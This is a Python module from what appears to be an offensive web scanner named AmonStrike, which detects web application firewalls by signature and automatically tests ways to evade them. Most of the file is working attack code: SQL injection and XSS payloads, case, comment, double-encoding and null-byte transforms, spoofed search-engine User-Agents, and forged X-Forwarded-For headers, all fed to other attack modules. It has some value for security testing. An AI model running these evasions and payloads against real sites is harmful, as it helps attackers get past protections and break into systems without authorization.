"""
AmonStrike — WAF Detection and Bypass Module
Detects WAF presence and automatically applies bypass techniques.
"""

import re
import time
import requests
from .base import BaseModule


class WafModule(BaseModule):
    NAME        = "waf"
    DESCRIPTION = "WAF detection and automatic bypass technique selection"

    # WAF signatures — name: [header/body patterns]
    WAF_SIGNATURES = {
        "Cloudflare": [
            "cf-ray", "cloudflare", "__cfduid", "cf-cache-status",
            "server: cloudflare"
        ],
        "Akamai": [
            "akamai", "ak-bmsc", "bm_sz", "x-akamai"
        ],
        "Imperva/Incapsula": [
            "incap_ses", "visid_incap", "x-iinfo", "x-cdn: Incapsula"
        ],
        "F5 BIG-IP ASM": [
            "bigipserver", "ts01", "ts:", "x-wa-info"
        ],
        "ModSecurity": [
            "mod_security", "modsecurity", "NOYB"
        ],
        "AWS WAF": [
            "awswaf", "x-amzn-requestid", "x-amz-cf-id"
        ],
        "Sucuri": [
            "x-sucuri-id", "x-sucuri-cache", "sucuri"
        ],
        "Barracuda": [
            "barracuda_", "barra_counter_session"
        ],
        "Wordfence": [
            "wordfence", "wfvt_"
        ],
        "Comodo": [
            "x-protected-by: COMODO WAF"
        ],
        "Fortinet FortiWeb": [
            "fortiwafsid", "cookiesession1"
        ],
        "Palo Alto": [
            "x-pan-token"
        ],
    }

    # WAF bypass techniques
    BYPASS_TECHNIQUES = [
        {
            "name": "Case Variation",
            "desc": "Vary case of SQL/XSS keywords",
            "apply": lambda p: re.sub(r'(?i)(select|union|where|from|and|or)',
                lambda m: ''.join(c.upper() if i%2==0 else c.lower()
                for i,c in enumerate(m.group())), p)
        },
        {
            "name": "URL Double Encoding",
            "desc": "Double-encode special characters",
            "apply": lambda p: p.replace("'", "%2527").replace(
                "<", "%253C").replace(">", "%253E")
        },
        {
            "name": "HTML Entity Encoding",
            "desc": "Use HTML entities",
            "apply": lambda p: p.replace("<", "&lt;").replace(">", "&gt;")
        },
        {
            "name": "Comment Injection",
            "desc": "Add SQL comments to break signatures",
            "apply": lambda p: re.sub(r'(?i)(select|union|where)',
                lambda m: m.group()[0] + "/**/" + m.group()[1:], p)
        },
        {
            "name": "Whitespace Variation",
            "desc": "Use alternative whitespace characters",
            "apply": lambda p: p.replace(" ", "/**/").replace(
                "+", "%09")
        },
        {
            "name": "Null Byte Injection",
            "desc": "Insert null bytes",
            "apply": lambda p: p.replace("'", "%00'")
        },
        {
            "name": "Unicode Normalization",
            "desc": "Use Unicode equivalents",
            "apply": lambda p: p.replace("'", "\u0027").replace(
                "<", "\u003C").replace(">", "\u003E")
        },
        {
            "name": "HTTP Parameter Pollution",
            "desc": "Duplicate parameters with split payloads",
            "apply": lambda p: p  # Handled at request level
        },
        {
            "name": "Chunked Transfer Encoding",
            "desc": "Use chunked encoding to bypass body inspection",
            "apply": lambda p: p  # Handled at request level
        },
        {
            "name": "Content-Type Variation",
            "desc": "Change Content-Type to confuse WAF parser",
            "apply": lambda p: p  # Handled at header level
        },
    ]

    # Alternative User-Agents for bypass
    BYPASS_USER_AGENTS = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "facebookexternalhit/1.1",
        "Twitterbot/1.0",
        "curl/7.68.0",
        "python-requests/2.28.0",
    ]

    def run(self):
        self.log("Detecting WAF presence...")

        # Step 1: Detect WAF
        waf_detected = self._detect_waf()

        if waf_detected:
            self.info["waf_detected"] = True
            self.info["waf_name"]     = waf_detected

            self.add_finding(
                title=f"WAF Detected: {waf_detected}",
                severity="INFO",
                description=f"A Web Application Firewall ({waf_detected}) is protecting this target. AmonStrike will automatically apply bypass techniques.",
                evidence=f"WAF identified: {waf_detected}",
                remediation="WAF is a good security control. Ensure it is properly configured and covers all endpoints.",
                url=self.url
            )

            # Step 2: Test bypass techniques
            self.log(f"WAF detected: {waf_detected} — testing bypasses...", "~")
            working_bypasses = self._test_bypasses()

            if working_bypasses:
                self.info["working_bypasses"] = working_bypasses
                self.add_finding(
                    title=f"WAF Bypass Techniques Work ({len(working_bypasses)})",
                    severity="HIGH",
                    description=f"The following WAF bypass techniques successfully evade {waf_detected}.",
                    evidence="Working bypasses:\n" + "\n".join(
                        [f"- {b}" for b in working_bypasses]
                    ),
                    remediation="Configure WAF to detect encoded and obfuscated attack patterns. Use normalize option if available.",
                    url=self.url
                )
            else:
                self.log("No simple bypasses found — WAF is well configured", "+")
        else:
            self.info["waf_detected"] = False
            self.log("No WAF detected — target is unprotected", "~")
            self.add_finding(
                title="No WAF Detected",
                severity="MEDIUM",
                description="No Web Application Firewall detected. The application is not protected by a WAF.",
                evidence="No WAF signatures found in response headers or body.",
                remediation="Deploy a WAF (CloudFlare, AWS WAF, ModSecurity) to add an additional layer of protection.",
                url=self.url
            )

        # Step 3: Test WAF bypass with actual payloads
        self._test_waf_payload_bypass()

        self.log(f"WAF analysis complete — {len(self.findings)} findings", "+")
        return self.result()

    def _detect_waf(self):
        """Detect WAF from response headers and body."""
        # Send a normal request first
        resp = self.get()
        if not resp:
            return None

        # Also send a malicious request to trigger WAF
        malicious_resp = self.get(params={
            "test": "' OR 1=1--",
            "xss": "<script>alert(1)</script>"
        })

        for resp_obj in [resp, malicious_resp]:
            if not resp_obj:
                continue

            headers_str = str(resp_obj.headers).lower()
            body_str    = resp_obj.text.lower()
            combined    = headers_str + body_str

            for waf_name, signatures in self.WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in combined:
                        return waf_name

            # Check for generic WAF block pages
            block_indicators = [
                "access denied", "request blocked", "security block",
                "forbidden", "illegal access", "attack detected",
                "suspicious activity", "waf", "firewall", "blocked by"
            ]
            if malicious_resp and any(ind in malicious_resp.text.lower()
                                      for ind in block_indicators):
                return "Generic WAF"

        return None

    def _test_bypasses(self):
        """Test which bypass techniques work."""
        working = []

        # Test payload
        test_payload = "' OR 1=1--"

        # First check if payload is blocked normally
        blocked_resp = self.get(params={"test": test_payload})
        if not blocked_resp:
            return []

        baseline_blocked = blocked_resp.status_code in [403, 406, 429, 503]
        if not baseline_blocked:
            return []  # WAF not blocking — no need to bypass

        # Try each bypass technique
        for technique in self.BYPASS_TECHNIQUES[:6]:
            try:
                bypassed_payload = technique["apply"](test_payload)
                resp = self.get(params={"test": bypassed_payload})

                if resp and resp.status_code not in [403, 406, 429, 503]:
                    working.append(technique["name"])
                    self.log(f"Bypass works: {technique['name']}", "+")

            except Exception:
                pass

        # Try User-Agent bypasses
        for ua in self.BYPASS_USER_AGENTS[:3]:
            resp = self.get(
                params={"test": test_payload},
                headers={"User-Agent": ua}
            )
            if resp and resp.status_code not in [403, 406, 429, 503]:
                working.append(f"User-Agent: {ua[:30]}")
                self.log(f"UA bypass works: {ua[:30]}", "+")
                break

        return working

    def _test_waf_payload_bypass(self):
        """Test if specific attack payloads bypass the WAF."""
        evasion_payloads = [
            # SQLi evasion
            ("SQLi WAF Bypass",     "1'/**/OR/**/1=1--"),
            ("SQLi Case Bypass",    "1' oR '1'='1"),
            ("SQLi Encoding",       "1%27%20OR%20%271%27%3D%271"),
            # XSS evasion
            ("XSS SVG Bypass",      "<svg/onload=alert(1)>"),
            ("XSS Encoding Bypass", "%3Cscript%3Ealert(1)%3C/script%3E"),
            ("XSS Case Bypass",     "<ScRiPt>alert(1)</sCrIpT>"),
        ]

        for name, payload in evasion_payloads:
            resp = self.get(params={"id": payload})
            if resp and resp.status_code == 200:
                self.add_finding(
                    title=f"WAF Bypass Payload Works: {name}",
                    severity="HIGH",
                    description=f"Payload '{payload}' successfully bypasses the WAF (HTTP 200 returned).",
                    evidence=f"Payload: {payload}\nResponse: HTTP {resp.status_code}",
                    remediation="Update WAF rules to detect encoded and obfuscated payloads.",
                    url=resp.url
                )

    def get_bypass_headers(self):
        """Return headers that help bypass WAF — for use by other modules."""
        working_ua = self.info.get("working_user_agent", "")
        headers = {}
        if working_ua:
            headers["User-Agent"] = working_ua

        if self.info.get("waf_detected"):
            headers["X-Forwarded-For"] = "127.0.0.1"
            headers["X-Real-IP"]       = "127.0.0.1"
            headers["X-Originating-IP"] = "127.0.0.1"

        return headers

    def get_bypass_payloads(self, base_payloads):
        """Apply bypass techniques to a list of base payloads."""
        if not self.info.get("waf_detected"):
            return base_payloads

        working = self.info.get("working_bypasses", [])
        if not working:
            return base_payloads

        # Apply all working techniques to each payload
        all_payloads = list(base_payloads)
        for technique in self.BYPASS_TECHNIQUES:
            if technique["name"] in working:
                for p in base_payloads:
                    try:
                        all_payloads.append(technique["apply"](p))
                    except Exception:
                        pass

        return all_payloads
